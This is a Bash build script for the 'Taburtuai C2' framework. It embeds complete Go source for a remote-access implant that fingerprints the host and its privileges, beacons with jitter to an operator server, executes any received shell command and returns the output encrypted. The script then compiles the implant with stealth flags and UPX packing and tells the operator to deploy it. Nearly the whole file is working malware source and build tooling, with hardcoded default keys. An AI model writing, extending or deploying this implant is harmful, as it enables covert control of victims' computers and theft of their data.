#!/bin/bash

# Enhanced Agent Build Script for Taburtuai C2
set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Defaults
DEFAULT_SERVER_URL="http://127.0.0.1:8080"
DEFAULT_KEY="SpookyOrcaC2AES1"
DEFAULT_SECONDARY_KEY="TaburtuaiSecondary"
DEFAULT_INTERVAL="30"
DEFAULT_JITTER="0.3"

BUILD_DIR="./bin"
AGENT_DIR="./agent"
STAGELESS_DIR="$AGENT_DIR/stageless"

print_status() { echo -e "${BLUE}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
print_error() { echo -e "${RED}[ERROR]${NC} $1"; }

show_usage() {
    cat << 'USAGE_EOF'
Enhanced Agent Build Script for Taburtuai C2

Usage: ./build_agent.sh [OPTIONS]

Options:
    -s, --server URL        C2 server URL (default: http://127.0.0.1:8080)
    -k, --key KEY          Primary encryption key (default: SpookyOrcaC2AES1)
    -i, --interval SEC     Beacon interval in seconds (default: 30)
    -j, --jitter FLOAT     Jitter factor 0.0-1.0 (default: 0.3)
    -o, --os TARGET        Target OS: windows, linux, darwin (default: current)
    -a, --arch ARCH        Target architecture: amd64, 386 (default: amd64)
    -n, --name NAME        Output filename (default: auto-generated)
    -S, --stealth          Enable stealth compilation options
    -c, --compress         Compress final binary with UPX
    -h, --help             Show this help message

Examples:
    # Build basic agent
    ./build_agent.sh

    # Build for Windows with custom server
    ./build_agent.sh -s http://192.168.1.100:8080 -o windows

    # Build with stealth options
    ./build_agent.sh -S -c -o windows
USAGE_EOF
}

validate_params() {
    print_status "Validating build parameters..."
    
    if ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] || [ "$INTERVAL" -lt 1 ]; then
        print_error "Invalid interval: $INTERVAL"
        exit 1
    fi
    
    case "$TARGET_OS" in
        windows|linux|darwin) ;;
        *) print_error "Invalid OS: $TARGET_OS"; exit 1 ;;
    esac
    
    case "$TARGET_ARCH" in
        amd64|386) ;;
        *) print_error "Invalid arch: $TARGET_ARCH"; exit 1 ;;
    esac
    
    print_success "Parameters validated"
}

setup_build_env() {
    print_status "Setting up build environment..."
    
    mkdir -p "$BUILD_DIR" "$AGENT_DIR" "$STAGELESS_DIR"
    
    if [ ! -f "$STAGELESS_DIR/go.mod" ]; then
        cat > "$STAGELESS_DIR/go.mod" << 'MOD_EOF'
module enhanced-agent

go 1.21

require ()
MOD_EOF
    fi
    
    print_success "Build environment setup complete"
}

create_agent_source() {
    print_status "Creating enhanced agent source with command execution..."
    
    local source_file="$STAGELESS_DIR/main.go"
    
    cat > "$source_file" << 'AGENT_SOURCE_EOF'

package main

import (
        "bytes"
        "compress/gzip"
        "context"
        "crypto/aes"
        "crypto/cipher"
        "crypto/rand"
        "crypto/sha256"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io"
        "math/big"
        "net/http"
        "os"
        "os/exec"
        "runtime"
        "strconv"
        "strings"
        "time"
)

// Configuration - will be replaced during build
var (
        defaultServerURL = "PLACEHOLDER_SERVER_URL"
        defaultKey      = "PLACEHOLDER_KEY"
    	defaultSecondaryKey = "PLACEHOLDER_SECONDARY_KEY" 
        defaultInterval = "PLACEHOLDER_INTERVAL"
        defaultJitter   = "PLACEHOLDER_JITTER"
)

// CryptoManager handles decryption
type CryptoManager struct {
        primaryKey   []byte
        secondaryKey []byte
        gcm          cipher.AEAD
}

type Agent struct {
        ID            string
        ServerURL     string
        EncryptionKey string
        Interval      time.Duration
        Jitter        float64
        isRunning     bool
        client        *http.Client
        crypto        *CryptoManager
}

type AgentInfo struct {
        ID           string `json:"id"`
        Hostname     string `json:"hostname"`
        Username     string `json:"username"`
        OS           string `json:"os"`
        Architecture string `json:"architecture"`
        ProcessID    int    `json:"process_id"`
        Privileges   string `json:"privileges"`
        WorkingDir   string `json:"working_dir"`
}

type Command struct {
        ID         string   `json:"id"`
        AgentID    string   `json:"agent_id"`
        Command    string   `json:"command"`
        Args       []string `json:"args,omitempty"`
        WorkingDir string   `json:"working_dir,omitempty"`
        Timeout    int      `json:"timeout,omitempty"`
}

type CommandResult struct {
        CommandID string `json:"command_id"`
        ExitCode  int    `json:"exit_code"`
        Output    string `json:"output"`
        Error     string `json:"error"`
        Encrypted bool   `json:"encrypted"`
}

func generateUUID() string {
        b := make([]byte, 16)
        _, err := rand.Read(b)
        if err != nil {
                now := time.Now().UnixNano()
                for i := range b {
                        b[i] = byte((now >> (i * 8)) & 0xFF)
                }
        }

        b[6] = (b[6] & 0x0f) | 0x40
        b[8] = (b[8] & 0x3f) | 0x80

        return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

// NewCryptoManager creates a new crypto manager
func NewCryptoManager(primaryKey, secondaryKey string) (*CryptoManager, error) {
        pKey := sha256.Sum256([]byte(primaryKey))
        sKey := sha256.Sum256([]byte(secondaryKey))

        block, err := aes.NewCipher(pKey[:])
        if err != nil {
                return nil, fmt.Errorf("failed to create cipher: %v", err)
        }

        gcm, err := cipher.NewGCM(block)
        if err != nil {
                return nil, fmt.Errorf("failed to create GCM: %v", err)
        }

        return &CryptoManager{
                primaryKey:   pKey[:],
                secondaryKey: sKey[:],
                gcm:          gcm,
        }, nil
}

func (cm *CryptoManager) DecryptData(obfuscatedData string) ([]byte, error) {
    fmt.Printf("[DECRYPT DEBUG] Input length: %d chars\n", len(obfuscatedData))
    fmt.Printf("[DECRYPT DEBUG] First 50 chars: %.50s\n", obfuscatedData)
    fmt.Printf("[DECRYPT DEBUG] Primary key: %x\n", cm.primaryKey[:8])
    
    encoded := cm.removeObfuscationMarkers(obfuscatedData)
    fmt.Printf("[DECRYPT DEBUG] After remove markers: %d chars\n", len(encoded))
    
    combined, err := cm.customBase64Decode(encoded)
    if err != nil {
        return nil, fmt.Errorf("base64 decode failed: %v", err)
    }
    fmt.Printf("[DECRYPT DEBUG] After base64 decode: %d bytes\n", len(combined))

    if len(combined) < cm.gcm.NonceSize() {
        return nil, fmt.Errorf("invalid data size: got %d, need at least %d", len(combined), cm.gcm.NonceSize())
    }

    nonce := combined[:cm.gcm.NonceSize()]
    encrypted := combined[cm.gcm.NonceSize():]
    fmt.Printf("[DECRYPT DEBUG] Nonce: %x\n", nonce)
    fmt.Printf("[DECRYPT DEBUG] Encrypted data size: %d bytes\n", len(encrypted))

    padded, err := cm.gcm.Open(nil, nonce, encrypted, nil)
    if err != nil {
        return nil, fmt.Errorf("decryption failed: %v", err)
    }

    compressed := cm.removePadding(padded)
    data, err := cm.decompressData(compressed)
    if err != nil {
        return nil, fmt.Errorf("decompression failed: %v", err)
    }

    return data, nil
}

// Tambahkan setelah DecryptData function
func (cm *CryptoManager) EncryptData(data []byte) (string, error) {
    // Layer 1: Compress data
    compressed, err := cm.compressData(data)
    if err != nil {
        return "", fmt.Errorf("compression failed: %v", err)
    }

    // Layer 2: Add padding
    padded := cm.addPadding(compressed)

    // Layer 3: AES-GCM encryption
    nonce := make([]byte, cm.gcm.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return "", fmt.Errorf("nonce generation failed: %v", err)
    }

    encrypted := cm.gcm.Seal(nil, nonce, padded, nil)

    // Layer 4: Combine nonce + encrypted data
    combined := append(nonce, encrypted...)

    // Layer 5: Base64 encoding (using standard for now)
    encoded := base64.StdEncoding.EncodeToString(combined)

    // Layer 6: Add obfuscation markers
    obfuscated := cm.addObfuscationMarkers(encoded)

    return obfuscated, nil
}

// Helper functions for encryption
func (cm *CryptoManager) compressData(data []byte) ([]byte, error) {
    var buf bytes.Buffer
    writer := gzip.NewWriter(&buf)
    
    if _, err := writer.Write(data); err != nil {
        return nil, err
    }
    
    if err := writer.Close(); err != nil {
        return nil, err
    }
    
    return buf.Bytes(), nil
}

func (cm *CryptoManager) addPadding(data []byte) []byte {
    // Add 1-16 bytes of random padding
    paddingSize := 1 + (len(data) % 16)
    padding := make([]byte, paddingSize)
    rand.Read(padding)
    
    // Prepend padding size as first byte, then padding, then data
    result := make([]byte, 1+paddingSize+len(data))
    result[0] = byte(paddingSize)
    copy(result[1:1+paddingSize], padding)
    copy(result[1+paddingSize:], data)
    
    return result
}

func (cm *CryptoManager) addObfuscationMarkers(data string) string {
    markers := []string{
        "session_id=", "token=", "data=", "payload=", "content=", "response=",
    }
    
    // Pick random marker
    n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(markers))))
    marker := markers[n.Int64()]
    return marker + data
}

func (cm *CryptoManager) removeObfuscationMarkers(data string) string {
        markers := []string{
                "session_id=", "token=", "data=", "payload=", "content=", "response=",
        }

        for _, marker := range markers {
                if strings.HasPrefix(data, marker) {
                        return data[len(marker):]
                }
        }
        return data
}

func (cm *CryptoManager) customBase64Decode(encoded string) ([]byte, error) {
    // TEMPORARY: Use standard base64 to fix encryption
    return base64.StdEncoding.DecodeString(encoded)
}

func (cm *CryptoManager) removePadding(data []byte) []byte {
        if len(data) < 2 {
                return data
        }

        paddingSize := int(data[0])
        if paddingSize >= len(data) {
                return data
        }

        return data[1+paddingSize:]
}

func (cm *CryptoManager) decompressData(data []byte) ([]byte, error) {
        reader, err := gzip.NewReader(bytes.NewReader(data))
        if err != nil {
                return nil, err
        }
        defer reader.Close()

        return io.ReadAll(reader)
}

func NewAgent() (*Agent, error) {
        interval, _ := strconv.Atoi(defaultInterval)
        if interval < 1 {
                interval = 30
        }

        jitter, _ := strconv.ParseFloat(defaultJitter, 64)
        if jitter < 0 || jitter > 1 {
                jitter = 0.3
        }

        // ADD DEBUG LOGGING
        fmt.Printf("[DEBUG] Primary Key: %s\n", defaultKey)
        fmt.Printf("[DEBUG] Secondary Key: %s\n", defaultSecondaryKey)

	crypto, err := NewCryptoManager(defaultKey, defaultSecondaryKey)
        if err != nil {
                fmt.Printf("[!] Failed to initialize crypto: %v\n", err)
                crypto = nil
        }

        return &Agent{
                ID:            generateUUID(),
                ServerURL:     defaultServerURL,
                EncryptionKey: defaultKey,
                Interval:      time.Duration(interval) * time.Second,
                Jitter:        jitter,
                isRunning:     false,
                client:        &http.Client{Timeout: 30 * time.Second},
                crypto:        crypto,
        }, nil
}

func (a *Agent) collectAgentInfo() AgentInfo {
        hostname, _ := os.Hostname()
        username := os.Getenv("USER")
        if username == "" {
                username = os.Getenv("USERNAME")
        }

        workDir, _ := os.Getwd()

        privileges := "user"
        if runtime.GOOS == "windows" {
                _, err := os.Open("\\\\.\\PHYSICALDRIVE0")
                if err == nil {
                        privileges = "admin"
                }
        } else {
                if os.Geteuid() == 0 {
                        privileges = "root"
                }
        }

        return AgentInfo{
                ID:           a.ID,
                Hostname:     hostname,
                Username:     username,
                OS:           runtime.GOOS,
                Architecture: runtime.GOARCH,
                ProcessID:    os.Getpid(),
                Privileges:   privileges,
                WorkingDir:   workDir,
        }
}

func (a *Agent) checkin() error {
    agentInfo := a.collectAgentInfo()
    
    var payload []byte
    var err error
    
    if a.crypto != nil {
        // Encrypt agent info
        jsonData, err := json.Marshal(agentInfo)
        if err != nil {
            return err
        }
        
        encrypted, err := a.crypto.EncryptData(jsonData)
        if err != nil {
            return err
        }
        
        // Wrap in encrypted envelope
        envelope := map[string]interface{}{
            "encrypted": encrypted,
        }
        
        payload, err = json.Marshal(envelope)
        if err != nil {
            return err
        }
        
        fmt.Printf("[*] Checkin data encrypted\n")
    } else {
        // Fallback to plaintext
        payload, err = json.Marshal(agentInfo)
        if err != nil {
            return err
        }
    }

    url := a.ServerURL + "/api/v1/checkin"
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
    if err != nil {
        return err
    }

    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

    resp, err := a.client.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    return nil
}

func (a *Agent) getNextCommand() (*Command, error) {
        url := fmt.Sprintf("%s/api/v1/command/%s/next", a.ServerURL, a.ID)

        req, err := http.NewRequest("GET", url, nil)
        if err != nil {
                return nil, err
        }

        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

        resp, err := a.client.Do(req)
        if err != nil {
                return nil, err
        }
        defer resp.Body.Close()

        if resp.StatusCode == 204 {
                return nil, nil
        }

        if resp.StatusCode != 200 {
                return nil, fmt.Errorf("server returned status %d", resp.StatusCode)
        }

        body, err := io.ReadAll(resp.Body)
        if err != nil {
                return nil, err
        }

        if len(body) == 0 {
                return nil, nil
        }

        var response struct {
                Success bool        `json:"success"`
                Data    interface{} `json:"data"`
                Error   string      `json:"error"`
        }

        if err := json.Unmarshal(body, &response); err != nil {
                return nil, fmt.Errorf("failed to parse JSON: %v", err)
        }

        if !response.Success {
                return nil, fmt.Errorf("server error: %s", response.Error)
        }

        if response.Data == nil {
                return nil, nil
        }

        // Check if data is encrypted
        if encData, ok := response.Data.(map[string]interface{}); ok {
                if encryptedStr, ok := encData["encrypted"].(string); ok {
                        fmt.Printf("[*] Received encrypted command, decrypting...\n")

                        if a.crypto != nil {
                                decrypted, err := a.crypto.DecryptData(encryptedStr)
                                if err != nil {
                                        fmt.Printf("[!] Decryption failed: %v\n", err)
                                        return nil, nil
                                }

                                fmt.Printf("[+] Command decrypted successfully\n")

                                var cmd Command
                                if err := json.Unmarshal(decrypted, &cmd); err != nil {
                                        fmt.Printf("[!] Failed to parse decrypted command: %v\n", err)
                                        return nil, nil
                                }

                                return &cmd, nil
                        } else {
                                fmt.Printf("[!] No crypto manager available\n")
                                return nil, nil
                        }
                }
        }

        // Parse unencrypted command
        cmdJSON, err := json.Marshal(response.Data)
        if err != nil {
                return nil, err
        }

        var cmd Command
        if err := json.Unmarshal(cmdJSON, &cmd); err != nil {
                return nil, fmt.Errorf("failed to parse command: %v", err)
        }

        return &cmd, nil
}

func (a *Agent) executeCommand(cmd *Command) *CommandResult {
        result := &CommandResult{
                CommandID: cmd.ID,
                ExitCode:  0,
                Output:    "",
                Error:     "",
        }

        fmt.Printf("[*] Executing command: %s\n", cmd.Command)

        originalDir, _ := os.Getwd()
        if cmd.WorkingDir != "" {
                if err := os.Chdir(cmd.WorkingDir); err != nil {
                        result.ExitCode = 1
                        result.Error = fmt.Sprintf("Failed to change directory: %v", err)
                        return result
                }
                defer os.Chdir(originalDir)
        }

        ctx := context.Background()
        if cmd.Timeout > 0 {
                var cancel context.CancelFunc
                ctx, cancel = context.WithTimeout(context.Background(), time.Duration(cmd.Timeout)*time.Second)
                defer cancel()
        }

        var execCmd *exec.Cmd
        if runtime.GOOS == "windows" {
                execCmd = exec.CommandContext(ctx, "cmd", "/C", cmd.Command)
        } else {
                execCmd = exec.CommandContext(ctx, "sh", "-c", cmd.Command)
        }

        var stdout, stderr bytes.Buffer
        execCmd.Stdout = &stdout
        execCmd.Stderr = &stderr

        err := execCmd.Run()

        result.Output = strings.TrimSpace(stdout.String())
        result.Error = strings.TrimSpace(stderr.String())

        if err != nil {
                if exitError, ok := err.(*exec.ExitError); ok {
                        result.ExitCode = exitError.ExitCode()
                } else {
                        result.ExitCode = 1
                        if result.Error == "" {
                                result.Error = err.Error()
                        }
                }
        }

        fmt.Printf("[+] Command completed (exit code: %d)\n", result.ExitCode)
        if result.Output != "" {
                fmt.Printf("[OUTPUT] %s\n", result.Output)
        }
        if result.Error != "" {
                fmt.Printf("[ERROR] %s\n", result.Error)
        }

        return result
}

func (a *Agent) submitResult(result *CommandResult) error {
    // Create a copy for potential encryption
    encryptedResult := *result
    
    // Encrypt output and error if crypto available
    if a.crypto != nil {
        fmt.Printf("[*] Encrypting command result...\n")
        
        if result.Output != "" {
            encrypted, err := a.crypto.EncryptData([]byte(result.Output))
            if err == nil {
                encryptedResult.Output = encrypted
                encryptedResult.Encrypted = true
                fmt.Printf("[+] Output encrypted (%d bytes -> %d chars)\n", 
                    len(result.Output), len(encrypted))
            } else {
                fmt.Printf("[!] Failed to encrypt output: %v\n", err)
            }
        }
        
        if result.Error != "" {
            encrypted, err := a.crypto.EncryptData([]byte(result.Error))
            if err == nil {
                encryptedResult.Error = encrypted
                encryptedResult.Encrypted = true
            }
        }
    } else {
        fmt.Printf("[!] No crypto manager, sending plaintext\n")
    }
    
    jsonData, err := json.Marshal(encryptedResult)
    if err != nil {
        return err
    }

    url := a.ServerURL + "/api/v1/command/result"
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
    if err != nil {
        return err
    }

    req.Header.Set("Content-Type", "application/json")

    resp, err := a.client.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()
    
    fmt.Printf("[+] Result submitted (encrypted: %v)\n", encryptedResult.Encrypted)

    return nil
}

func (a *Agent) getBeaconInterval() time.Duration {
        if a.Jitter <= 0 {
                return a.Interval
        }

        jitterRange := float64(a.Interval) * a.Jitter
        jitterNs := int64(jitterRange)

        if jitterNs <= 0 {
                return a.Interval
        }

        b := make([]byte, 8)
        rand.Read(b)
        randomJitter := int64(b[0])<<56 | int64(b[1])<<48 | int64(b[2])<<40 | int64(b[3])<<32 |
                int64(b[4])<<24 | int64(b[5])<<16 | int64(b[6])<<8 | int64(b[7])

        randomJitter = randomJitter % (jitterNs * 2)
        actualJitter := randomJitter - jitterNs

        finalDuration := a.Interval + time.Duration(actualJitter)
        if finalDuration < time.Second {
                finalDuration = time.Second
        }

        return finalDuration
}

func (a *Agent) Start() error {
        a.isRunning = true

        fmt.Printf("[*] Starting enhanced agent %s\n", a.ID)
        fmt.Printf("[*] Target server: %s\n", a.ServerURL)
        fmt.Printf("[*] Beacon interval: %v (jitter: %.1f%%)\n", a.Interval, a.Jitter*100)

        if err := a.checkin(); err != nil {
                fmt.Printf("[!] Initial checkin failed: %v\n", err)
                return err
        } else {
                fmt.Printf("[+] Initial checkin successful\n")
        }

        for a.isRunning {
                cmd, err := a.getNextCommand()
                if err != nil {
                        fmt.Printf("[!] Failed to get command: %v\n", err)
                } else if cmd != nil {
                        fmt.Printf("[*] Received command: %s (ID: %s)\n", cmd.Command, cmd.ID)

                        result := a.executeCommand(cmd)

                        if err := a.submitResult(result); err != nil {
                                fmt.Printf("[!] Failed to submit result: %v\n", err)
                        } else {
                                fmt.Printf("[+] Result submitted successfully\n")
                        }
                } else {
                        fmt.Printf("[*] No pending commands\n")
                }

                if err := a.checkin(); err != nil {
                        fmt.Printf("[!] Checkin failed: %v\n", err)
                }

                sleepDuration := a.getBeaconInterval()
                fmt.Printf("[*] Sleeping for %v\n", sleepDuration)
                time.Sleep(sleepDuration)
        }

        return nil
}

func main() {
        agent, err := NewAgent()
        if err != nil {
                fmt.Printf("[!] Failed to create agent: %v\n", err)
                os.Exit(1)
        }

        if err := agent.Start(); err != nil {
                fmt.Printf("[!] Agent failed: %v\n", err)
                os.Exit(1)
        }
}

AGENT_SOURCE_EOF

    print_success "Enhanced agent source created with decryption support"
}

prepare_source() {
    print_status "Preparing source code with build configuration..."
    
    local source_file="$STAGELESS_DIR/main.go"
    
    if [ ! -f "$source_file" ]; then
        print_error "Agent source file not found: $source_file"
        exit 1
    fi
    
    # Replace placeholders
    if [[ "$OSTYPE" == "darwin"* ]]; then
        sed -i '' \
            -e "s|PLACEHOLDER_SERVER_URL|$SERVER_URL|g" \
            -e "s|PLACEHOLDER_KEY|$KEY|g" \
            -e "s|PLACEHOLDER_SECONDARY_KEY|$DEFAULT_SECONDARY_KEY|g" \
            -e "s|PLACEHOLDER_INTERVAL|$INTERVAL|g" \
            -e "s|PLACEHOLDER_JITTER|$JITTER|g" \
            "$source_file"
    else
        sed -i \
            -e "s|PLACEHOLDER_SERVER_URL|$SERVER_URL|g" \
            -e "s|PLACEHOLDER_KEY|$KEY|g" \
            -e "s|PLACEHOLDER_SECONDARY_KEY|$DEFAULT_SECONDARY_KEY|g" \
            -e "s|PLACEHOLDER_INTERVAL|$INTERVAL|g" \
            -e "s|PLACEHOLDER_JITTER|$JITTER|g" \
            "$source_file"
    fi
    
    print_success "Source code prepared"
}

build_agent() {
    print_status "Building enhanced agent..."
    
    if [ -z "$OUTPUT_NAME" ]; then
        OUTPUT_NAME="enhanced_agent_${TARGET_OS}_${TARGET_ARCH}"
        if [ "$TARGET_OS" = "windows" ]; then
            OUTPUT_NAME="${OUTPUT_NAME}.exe"
        fi
    fi
    
    local ldflags=""
    if [ "$STEALTH" = true ]; then
        ldflags="-s -w"
        if [ "$TARGET_OS" = "windows" ]; then
            ldflags="$ldflags -H windowsgui"
        fi
        print_status "Stealth mode enabled"
    fi
    
    export GOOS="$TARGET_OS"
    export GOARCH="$TARGET_ARCH"
    export CGO_ENABLED=0
    
    print_status "Building for $TARGET_OS/$TARGET_ARCH..."
    
    cd "$STAGELESS_DIR"
    if go build -ldflags "$ldflags" -o "../../$BUILD_DIR/$OUTPUT_NAME" .; then
        print_success "Agent built successfully: $BUILD_DIR/$OUTPUT_NAME"
    else
        print_error "Build failed"
        exit 1
    fi
    cd - > /dev/null
}

compress_binary() {
    if [ "$COMPRESS" = true ]; then
        print_status "Compressing binary with UPX..."
        
        if command -v upx >/dev/null 2>&1; then
            if upx --best "$BUILD_DIR/$OUTPUT_NAME" 2>/dev/null; then
                print_success "Binary compressed"
            else
                print_warning "UPX compression failed"
            fi
        else
            print_warning "UPX not found, skipping compression"
        fi
    fi
}

show_summary() {
    local file_size
    if [ -f "$BUILD_DIR/$OUTPUT_NAME" ]; then
        file_size=$(ls -lh "$BUILD_DIR/$OUTPUT_NAME" | awk '{print $5}')
    else
        file_size="Unknown"
    fi
    
    echo ""
    echo -e "${GREEN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                    Enhanced Agent Build Complete                ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}Build Details:${NC}"
    echo -e "  Target:          ${YELLOW}$TARGET_OS/$TARGET_ARCH${NC}"
    echo -e "  Output:          ${YELLOW}$BUILD_DIR/$OUTPUT_NAME${NC}"
    echo -e "  File Size:       ${YELLOW}$file_size${NC}"
    echo -e "  Server URL:      ${YELLOW}$SERVER_URL${NC}"
    echo -e "  Encryption Key:  ${YELLOW}${KEY:0:8}...${NC}"
    echo -e "  Beacon Interval: ${YELLOW}${INTERVAL}s${NC}"
    echo -e "  Jitter:          ${YELLOW}${JITTER}${NC}"
    echo ""
    echo -e "${BLUE}Features:${NC}"
    echo -e "  ${GREEN}✓${NC} UUID-based agent identification"
    echo -e "  ${GREEN}✓${NC} Enhanced communication protocol"
    echo -e "  ${GREEN}✓${NC} Command execution with decryption support"
    echo -e "  ${GREEN}✓${NC} Configurable beacon intervals with jitter"
    echo -e "  ${GREEN}✓${NC} Cross-platform compatibility"
    echo ""
    echo -e "${BLUE}Next Steps:${NC}"
    echo -e "  ${GREEN}1.${NC} Deploy: ${YELLOW}$BUILD_DIR/$OUTPUT_NAME${NC}"
    echo -e "  ${GREEN}2.${NC} Monitor: ${YELLOW}taburtuai-cli agents list${NC}"
    echo -e "  ${GREEN}3.${NC} Execute: ${YELLOW}taburtuai-cli cmd [agent-id] \"whoami\"${NC}"
    echo -e "  ${GREEN}4.${NC} Dashboard: ${YELLOW}$SERVER_URL${NC}"
    echo ""
}

parse_args() {
    # Set defaults
    SERVER_URL="$DEFAULT_SERVER_URL"
    KEY="$DEFAULT_KEY"
    INTERVAL="$DEFAULT_INTERVAL"
    JITTER="$DEFAULT_JITTER"
    TARGET_OS=$(go env GOOS 2>/dev/null || echo "linux")
    TARGET_ARCH="amd64"
    OUTPUT_NAME=""
    STEALTH=false
    COMPRESS=false
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -s|--server)
                SERVER_URL="$2"
                shift 2
                ;;
            -k|--key)
                KEY="$2"
                shift 2
                ;;
            -i|--interval)
                INTERVAL="$2"
                shift 2
                ;;
            -j|--jitter)
                JITTER="$2"
                shift 2
                ;;
            -o|--os)
                TARGET_OS="$2"
                shift 2
                ;;
            -a|--arch)
                TARGET_ARCH="$2"
                shift 2
                ;;
            -n|--name)
                OUTPUT_NAME="$2"
                shift 2
                ;;
            -S|--stealth)
                STEALTH=true
                shift
                ;;
            -c|--compress)
                COMPRESS=true
                shift
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            *)
                print_error "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done
}

check_dependencies() {
    print_status "Checking build dependencies..."
    
    if ! command -v go >/dev/null 2>&1; then
        print_error "Go is not installed or not in PATH"
        exit 1
    fi
    
    local go_version=$(go version | grep -oE 'go[0-9]+\.[0-9]+' | sed 's/go//')
    print_success "Go $go_version found"
    
    if [ "$COMPRESS" = true ] && ! command -v upx >/dev/null 2>&1; then
        print_warning "UPX not found - compression will be skipped"
        COMPRESS=false
    fi
}

debug_config() {
    if [ "${VERBOSE:-false}" = true ]; then
        echo ""
        echo -e "${BLUE}Debug Configuration:${NC}"
        echo -e "  Server URL: ${YELLOW}$SERVER_URL${NC}"
        echo -e "  Encryption Key: ${YELLOW}${KEY:0:8}...${NC}"
        echo -e "  Target OS: ${YELLOW}$TARGET_OS${NC}"
        echo -e "  Target Arch: ${YELLOW}$TARGET_ARCH${NC}"
        echo -e "  Interval: ${YELLOW}$INTERVAL${NC}"
        echo -e "  Jitter: ${YELLOW}$JITTER${NC}"
        echo -e "  Stealth: ${YELLOW}$STEALTH${NC}"
        echo -e "  Compress: ${YELLOW}$COMPRESS${NC}"
        echo ""
    fi
}

main() {
    echo -e "${BLUE}"
    cat << 'HEADER_EOF'
╔══════════════════════════════════════════════════════════════════╗
║               Enhanced Agent Build Script v2.2                  ║
║                    Taburtuai C2 - Phase 2A                      ║
╚══════════════════════════════════════════════════════════════════╝
HEADER_EOF
    echo -e "${NC}"
    
    parse_args "$@"
    debug_config
    check_dependencies
    validate_params
    setup_build_env
    create_agent_source
    prepare_source
    build_agent
    compress_binary
    show_summary
    
    print_success "Enhanced agent build completed successfully!"
    echo ""
    echo -e "${YELLOW}Note: Remember to add the Go source code to create_agent_source() function${NC}"
    echo -e "${YELLOW}      The agent source should include decryption capabilities${NC}"
}

main "$@"
